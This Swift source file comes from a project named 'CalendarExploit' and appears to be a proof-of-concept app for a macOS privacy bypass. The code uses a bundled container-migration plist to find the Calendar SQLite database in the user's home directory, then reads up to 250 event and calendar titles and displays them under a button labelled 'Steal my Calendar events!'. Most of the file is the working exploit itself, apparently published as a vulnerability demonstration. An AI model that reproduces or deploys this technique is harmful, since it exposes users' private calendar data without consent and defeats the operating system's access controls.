//
//  ContentView.swift
//  CalendarExploit
//
//  Created by Pedro José Pereira Vieito on 12/3/24.
//

import SwiftUI
import SQLite

struct ContentView: SwiftUI.View {
    struct CalendarEvent: Identifiable {
        var id: UUID
        let eventTitle: String?
        let calendarTitle: String?
    }
    
    @State var events: [CalendarEvent] = []
    
    var body: some SwiftUI.View {
        VStack {
            Button {
                Task {
                    let containerMigrationPlistURL = Bundle.main.url(forResource: "container-migration", withExtension: "plist")!
                    let containerMigrationPlistData = try! Data(contentsOf: containerMigrationPlistURL)
                    let containerMigrationPlist = try! PropertyListSerialization.propertyList(from: containerMigrationPlistData, format: nil) as! [String: [[String]]]
                    let itemPath = containerMigrationPlist["Move"]!.first!.last!.replacingOccurrences(of: "${Home}/", with: "")
                    let calendarDatabase = FileManager.default.homeDirectoryForCurrentUser.appendingPathComponent(itemPath)
                    
                    do {
                        print("[!] Loading calendar database at “\(calendarDatabase.path)”)…")
                        let db = try Connection(calendarDatabase.path)
                        
                        let query =  """
                            SELECT i.summary
                                , c.title
                            FROM CalendarItem i
                            INNER JOIN Calendar c
                                ON i.calendar_id = c.ROWID
                            LIMIT 250
                            """
                        
                        var events: [CalendarEvent] = []
                        for row in try db.prepare(query) {
                            let eventTitle = "\(row[0] ?? "--")"
                            let calendarTitle = "\(row[1] ?? "--")"
                            let event = CalendarEvent(id: UUID(), eventTitle: eventTitle, calendarTitle: calendarTitle)
                            print("[*] \(eventTitle), \(calendarTitle))")
                            events.append(event)
                        }
                        self.events = events
                        
                    }
                    catch {
                        print("[x] \(error.localizedDescription)")
                    }
                }
            } label: {
                Image(systemName: "lock.open.trianglebadge.exclamationmark.fill")
                Text("Steal my Calendar events!")
            }
            .padding()
            
            if !events.isEmpty {
                Form {
                    List {
                        ForEach(self.events) { event in
                            HStack {
                                VStack(alignment: .leading) {
                                    Text(event.eventTitle ?? "--")
                                        .font(.headline)
                                    if let detail = event.calendarTitle {
                                        Text(detail)
                                            .font(.subheadline)
                                    }
                                }
                            }
                        }
                    }
                }
                .formStyle(.grouped)
            }
        }
    }
}

#Preview {
    ContentView()
}
